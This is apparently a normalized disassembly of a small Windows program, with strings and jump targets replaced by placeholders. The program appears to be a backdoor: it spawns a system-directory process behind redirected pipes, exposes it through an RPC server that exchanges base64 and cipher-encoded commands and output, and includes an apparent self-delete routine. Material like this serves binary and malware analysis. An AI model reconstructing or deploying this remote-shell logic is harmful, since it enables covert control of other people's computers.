sub_401000
push ecx
push ebx
push esi
mov esi [ esp + 0x14 ]
mov ecx 0x3
mov eax esi
xor ebx ebx
cdq
idiv ecx
cmp edx ebx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax esi
jmp r-xdata
cmp edx 0x2
lea eax [ esi + 0x1 ]
je r-xdata
lea eax [ esi + 0x2 ]
jmp r-xdata
lea ecx [ eax * 4 ]
mov eax 0x55555556
imul ecx
mov ecx [ esp + 0x1c ]
mov eax edx
shr eax 0x1f
add edx eax
dec ecx
cmp ecx edx
jge r-xdata
mov eax [ esp + 0x8 ]
push ebp
lea edx [ esi + 0x1 ]
push edi
push edx
mov [ esp + 0x14 ] esi
mov [ esp + 0x28 ] ebx
call ??2@YAPAXI@Z
mov ecx esi
mov esi [ esp + 0x1c ]
mov ebp eax
mov eax ecx
mov edi ebp
add esp 0x4
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x20 ]
cmp ecx 0x3
mov [ ecx + ebp ] 0x0
jl r-xdata
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
cmp eax 0x2
jne r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea eax [ edx + edx * 2 ]
sub ecx eax
mov [ esp + 0x10 ] ecx
cmp eax 0x1
jne r-xdata
mov eax [ esp + 0x24 ]
mov cl [ eax + ebp ]
lea edi [ eax + ebp + 0x1 ]
sar ecx 0x2
and ecx 0x3f
mov dl [ ecx + rw-data ]
mov [ ebx + esi ] dl
mov al [ eax + ebp ]
mov cl [ edi ]
and eax 0x3
sar ecx 0x4
shl eax 0x4
and ecx 0xf
or eax ecx
mov dl [ eax + rw-data ]
mov [ ebx + esi + 0x1 ] dl
mov al [ edi ]
and eax 0xf
mov cl [ eax * 4 + rw-data ]
mov [ ebx + esi + 0x2 ] cl
mov [ ebx + esi + 0x3 ] 0x3d
jmp r-xdata
mov edi [ esp + 0x24 ]
add ebx 0x4
mov cl [ edi + ebp ]
add edi 0x3
sar ecx 0x2
and ecx 0x3f
mov [ esp + 0x24 ] edi
mov al [ ecx + rw-data ]
mov [ esi + ebx - 0x4 ] al
mov cl [ edi + ebp - 0x3 ]
mov al [ edi + ebp - 0x2 ]
and ecx 0x3
sar eax 0x4
shl ecx 0x4
and eax 0xf
or ecx eax
mov cl [ ecx + rw-data ]
mov [ esi + ebx - 0x3 ] cl
mov al [ edi + ebp - 0x1 ]
mov cl [ edi + ebp - 0x2 ]
sar eax 0x6
and ecx 0xf
and eax 0x3
shl ecx 0x2
or eax ecx
mov al [ eax + rw-data ]
mov [ esi + ebx - 0x2 ] al
mov cl [ edi + ebp - 0x1 ]
and ecx 0x3f
dec edx
mov al [ ecx + rw-data ]
mov [ esi + ebx - 0x1 ] al
jne r-xdata
push ebp
mov [ ebx + esi ] 0x0
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop edi
pop ebp
pop esi
pop ebx
pop ecx
retn
mov eax [ esp + 0x24 ]
mov dl [ eax + ebp ]
sar edx 0x2
and edx 0x3f
mov cl [ edx + rw-data ]
mov [ ebx + esi ] cl
mov dl [ eax + ebp ]
and edx 0x3
shl edx 0x4
mov al [ edx + rw-data ]
mov [ ebx + esi + 0x1 ] al
mov al 0x3d
mov [ ebx + esi + 0x2 ] al
mov [ ebx + esi + 0x3 ] al
add ebx 0x4
sub_4011d0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
mov eax edi
and eax 0x80000003
jns r-xdata
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
push rw-data
push esi
xor ebx ebx
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push 0x3d
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ebx 0x2
jmp r-xdata
lea eax [ edi + edi * 2 ]
cdq
and edx 0x3
add eax edx
mov ecx eax
mov eax [ esp + 0x18 ]
sar ecx 0x2
sub ecx ebx
cmp eax ecx
jge r-xdata
mov ebx 0x1
sub edi ebx
push ebp
mov [ esp + 0x14 ] edi
push eax
xor edi edi
xor ebx ebx
call ??2@YAPAXI@Z
mov ebp eax
mov eax [ esp + 0x18 ]
add esp 0x4
cmp eax 0x4
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp eax 0x3
jne r-xdata
mov ecx eax
shr ecx 0x2
mov [ esp + 0x1c ] ecx
neg ecx
lea edx [ eax + ecx * 4 ]
mov [ esp + 0x14 ] edx
cmp eax 0x2
jne r-xdata
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ edi + esi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x1 ]
sub eax rw-data
sar eax 0x2
or cl al
add esp 0x18
mov [ ebx + ebp + 0x1 ] cl
add ebx 0x2
jmp r-xdata
movsx eax [ esi + edi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ esi + edi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov dl [ ebx + ebp ]
sub eax rw-data
mov ecx eax
sar ecx 0x4
or dl cl
shl al 0x4
mov [ ebx + ebp ] dl
mov [ ebx + ebp + 0x1 ] al
movsx edx [ esi + edi + 0x2 ]
push edx
push rw-data
call [ strchr@IAT ]
mov dl [ ebx + ebp + 0x1 ]
sub eax rw-data
mov ecx eax
sar ecx 0x2
or dl cl
shl al 0x6
mov [ ebx + ebp + 0x1 ] dl
mov [ ebx + ebp + 0x2 ] al
movsx edx [ esi + edi + 0x3 ]
push edx
push rw-data
call [ strchr@IAT ]
mov cl [ ebx + ebp + 0x2 ]
sub eax rw-data
or cl al
mov eax [ esp + 0x3c ]
mov [ ebx + ebp + 0x2 ] cl
add esp 0x20
add edi 0x4
add ebx 0x3
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov ecx ebx
mov eax ecx
mov esi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebp
and ecx 0x3
[ edi ] [ esi ]
call ??3@YAXPAX@Z
add esp 0x4
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
movsx eax [ edi + esi ]
push eax
push rw-data
call [ strchr@IAT ]
mov ecx rw-data
sub al cl
shl al 0x2
mov [ ebx + ebp ] al
movsx edx [ edi + esi + 0x1 ]
push edx
push ecx
call [ strchr@IAT ]
mov cl [ ebx + ebp ]
sub eax rw-data
sar eax 0x4
or cl al
add esp 0x10
mov [ ebx + ebp ] cl
inc ebx
sub_401410
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
lea ebx [ eax + 0x1 ]
push ebx
call [ malloc@IAT ]
mov ecx ebx
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
push ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x1c ]
push eax
call sub_401c50
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
push ecx
push ebx
push esi
call sub_4011d0
mov edi eax
push esi
mov [ edi + ebx ] 0x0
call [ free@IAT ]
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
pop ebx
retn
sub_401480
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
lea ebx [ ebp + 0x1 ]
push ebx
call [ malloc@IAT ]
mov ecx ebx
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
push ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
[ edi ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push eax
push ecx
call sub_401000
add esp 0x14
test eax eax
jne r-xdata
mov ebx [ esp + 0x1c ]
push ebp
push ebx
push esi
call sub_401b70
mov edi eax
push esi
mov [ edi + ebx ] 0x0
call [ free@IAT ]
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4014f0
sub esp 0x428
push ebp
push esi
push edi
mov ecx 0x70
xor eax eax
lea edi [ esp + 0x14 ]
[ edi ]
mov ebp [ esp + 0x438 ]
push 0x1c3
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x18 ]
mov edi ebp
push eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebp
call sub_401410
add esp 0x10
mov ecx 0x96
xor eax eax
mov edi ebp
[ edi ]
stosb [ edi ]
mov [ esp + 0x10 ] 0x0
mov [ esp + 0xc ] 0x0
mov esi rw-data
lea eax [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi rw-data
lea eax [ esp + 0x14 ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x14 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x259
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push ebp
[ edi ] [ esi ]
mov ecx 0x96
mov edi ebp
[ edi ]
stosb [ edi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x20 ]
push ecx
call sub_401480
add esp 0x10
pop edi
pop esi
pop ebp
add esp 0x428
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
lea eax [ esp + 0x14 ]
mov esi rw-data
lea eax [ esp + 0x14 ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov ecx 0x70
xor eax eax
lea edi [ esp + 0x14 ]
push 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x96
xor eax eax
mov edi ebp
push 0x0
[ edi ]
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
stosb [ edi ]
mov eax [ rw-data ]
push ecx
push 0x1c2
push edx
push eax
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
[ edi ]
not ecx
push 0x259
dec ecx
push ebp
lea eax [ esp + 0x1c ]
push ecx
push eax
call sub_401480
add esp 0x10
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebp
add esp 0x428
retn
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1d8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1d8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ esp + 0x1e0 ]
or ecx 0xffffffff
xor eax eax
mov edx [ rw-data ]
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x1e4 ]
push ecx
push edx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x1d8 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x1dc ]
[ edi ] [ esi ]
lea ecx [ esp + 0x14 ]
lea edi [ esp + 0x1dc ]
push ecx
or ecx 0xffffffff
[ edi ]
mov eax [ rw-data ]
not ecx
dec ecx
push ecx
push edx
push eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
pop edi
pop esi
pop ebp
add esp 0x428
retn
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x20 ]
push edx
push eax
call [ ReadFile@IAT ]
mov ecx [ esp + 0xc ]
lea edi [ esp + 0x14 ]
xor eax eax
push 0x259
mov [ esp + ecx + 0x18 ] 0x0
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ebp
lea edx [ esp + 0x1c ]
push ecx
push edx
call sub_401480
add esp 0x10
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_401830
sub esp 0x164
push ebx
push esi
push edi
lea eax [ esp + 0x6c ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x6c ]
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xc ] 0xc
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0xc ]
and ecx 0x3
mov [ esp + 0x14 ] 0x1
[ edi ] [ esi ]
mov edi [ CreatePipe@IAT ]
xor esi esi
push esi
push eax
push rw-data
push rw-data
mov [ esp + 0x20 ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call edi
lea ecx [ esp + 0xc ]
push esi
push ecx
push rw-data
push rw-data
call edi
lea edx [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x44
push edx
call [ GetStartupInfoA@IAT ]
mov eax [ rw-data ]
lea ecx [ esp + 0x5c ]
lea edx [ esp + 0x18 ]
push ecx
push edx
push esi
mov [ esp + 0x5c ] eax
mov eax [ rw-data ]
push esi
push esi
push 0x1
mov [ esp + 0x70 ] eax
mov [ esp + 0x6c ] eax
push esi
push esi
lea eax [ esp + 0x8c ]
push rw-data
push eax
mov [ esp + 0x70 ] si
mov [ esp + 0x6c ] 0x101
call [ CreateProcessA@IAT ]
push esi
push rw-data
push 0xa
push rw-data
call [ RpcServerUseProtseqEpA@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push esi
push esi
push ecx
call [ RpcServerRegisterIf@IAT ]
test eax eax
je r-xdata
call sub_401d30
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x164
retn
push esi
push 0x4d2
push 0x1
call [ RpcServerListen@IAT ]
test eax eax
je r-xdata
call sub_401d30
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x164
retn
call sub_401d30
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x164
retn
call sub_401d30
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x164
retn
sub_4019c0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push r--data
lea eax [ ebp - 0xf8 ]
push eax
mov esi [ ebp + 0x8 ]
push esi
call [ NdrServerInitializeNew@IAT ]
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x4 ]
and ecx 0xffff
cmp ecx 0x10
je r-xdata
push edi
push r--data
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
call [ NdrNonConformantStringUnmarshall@IAT ]
mov edx [ ebp - 0xf4 ]
cmp edx [ ebp - 0xec ]
jbe r-xdata
push r--data
lea edx [ ebp - 0xf8 ]
push edx
call [ NdrConvert@IAT ]
mov [ ebp - 0x4 ] edi
mov eax [ ebp - 0x1c ]
push eax
call sub_4014f0
add esp 0x4
mov eax 0x261
mov [ ebp - 0xe4 ] eax
mov [ esi + 0xc ] eax
push esi
call [ I_RpcGetBuffer@IAT ]
mov [ ebp - 0xfc ] eax
cmp eax edi
je r-xdata
push 0x6f7
call [ RpcRaiseException@IAT ]
mov ecx [ esi + 0x8 ]
mov [ ebp - 0xf4 ] ecx
push r--data
mov edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0xf8 ]
push eax
call [ NdrNonConformantStringMarshall@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_401b1c
mov eax [ ebp - 0xf4 ]
sub eax [ esi + 0x8 ]
mov [ esi + 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ RpcRaiseException@IAT ]
sub_401add
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov eax [ edx ]
cmp eax 0xc0000005
je r-xdata
mov eax 0x1
retn
cmp eax 0x80000002
je r-xdata
cmp eax 0x6f7
je r-xdata
cmp eax 0x6c6
je r-xdata
xor eax eax
retn
sub_401b70
mov edx [ esp + 0x4 ]
sub esp 0x8
or ecx 0xffffffff
xor eax eax
push edi
mov edi edx
[ edi ]
mov eax [ esp + 0x18 ]
not ecx
dec ecx
dec eax
cmp eax ecx
jge r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ esp + 0x4 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0x8 ] ecx
jle r-xdata
xor eax eax
pop edi
add esp 0x8
retn
mov edx [ esp + 0x14 ]
mov eax edi
mov [ edi + edx ] 0x0
pop edi
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
mov eax edx
push ebx
sub eax ecx
push ebp
mov ebp [ strchr@IAT ]
push esi
mov [ esp + 0x1c ] eax
jmp r-xdata
mov ecx [ esp + 0x20 ]
lea ebx [ edi + ecx ]
movsx edx [ eax + ebx ]
push edx
push rw-data
call ebp
mov esi eax
mov eax edi
cdq
idiv [ esp + 0x2c ]
sub esi rw-data
movsx eax [ edx + rw-data ]
push eax
push rw-data
call ebp
sub esi rw-data
add esp 0x10
add eax esi
cdq
idiv [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
inc edi
cmp edi eax
mov cl [ edx + rw-data ]
mov [ ebx ] cl
jl r-xdata
mov eax [ esp + 0x1c ]
pop esi
pop ebp
pop ebx
sub_401c50
push ecx
mov edx [ esp + 0x8 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esp + 0x14 ]
not ecx
dec ecx
dec eax
cmp eax ecx
jge r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
push esi
dec ecx
xor esi esi
mov [ esp + 0xc ] ecx
test ecx ecx
jle r-xdata
xor eax eax
pop edi
pop ecx
retn
mov eax [ esp + 0x18 ]
mov [ esi + eax ] 0x0
mov eax esi
pop esi
pop ebp
pop edi
pop ecx
retn
mov ecx [ esp + 0x18 ]
mov eax edx
sub eax ecx
push ebx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea ebx [ esi + ecx ]
movsx edx [ eax + ebx ]
push edx
push rw-data
call [ strchr@IAT ]
mov edi eax
mov eax esi
cdq
idiv [ esp + 0x28 ]
sub edi rw-data
movsx eax [ edx + rw-data ]
push eax
push rw-data
call [ strchr@IAT ]
lea ecx [ edi + ebp + rw-data ]
add esp 0x10
sub ecx eax
mov eax ecx
cdq
idiv ebp
mov eax [ esp + 0x10 ]
inc esi
cmp esi eax
mov dl [ edx + rw-data ]
mov [ ebx ] dl
jl r-xdata
mov eax [ esp + 0x18 ]
pop ebx
sub_401d30
sub esp 0x348
lea eax [ esp + 0x3c ]
push ebx
push ebp
push esi
push edi
push 0x104
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x348
retn
lea ecx [ esp + 0x4c ]
push 0x104
lea edx [ esp + 0x50 ]
push ecx
push edx
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x254 ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ esp + 0x4c ]
lea eax [ esp + 0x150 ]
push edx
push eax
call esi
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call esi
mov [ esp + 0x18 ] edi
lea edx [ esp + 0x254 ]
lea eax [ esp + 0x150 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ esp + 0x14 ] 0x3c
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x18 ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
mov ebp [ SetThreadPriority@IAT ]
push eax
call ebp
lea ecx [ esp + 0x10 ]
push ecx
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call ebp
mov edx [ esp + 0x48 ]
push 0x40
push edx
call esi
mov eax [ esp + 0x48 ]
push 0x1
push eax
call [ SetProcessPriorityBoost@IAT ]
lea ecx [ esp + 0x4c ]
push 0x0
push ecx
push 0x1
push 0x4
call [ SHChangeNotify@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x348
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x1
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401fd7
cmp [ rw-data ] 0x0
jne r-xdata
call sub_401fc2
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
call [ __p___initenv@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
call sub_401830
add esp 0x30
mov [ ebp - 0x24 ] eax
push eax
call [ exit@IAT ]
push sub_401fd4
call [ __setusermatherr@IAT ]
pop ecx
sub_401b1c
mov eax [ ebp - 0x1c ]
cmp eax edi
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
push eax
call [ ebp - 0xac ]
retn
push edi
call [ RpcMgmtStopServerListening@IAT ]
sub_401b40
mov eax [ esp + 0x4 ]
push eax
call [ malloc@IAT ]
add esp 0x4
retn 0x4
sub_401b60
mov eax [ esp + 0x4 ]
push eax
call [ free@IAT ]
pop ecx
retn 0x4
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401fc2
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401fd4
xor eax eax
retn
sub_401fd7
retn
_controlfp
jmp [ _controlfp@IAT ]
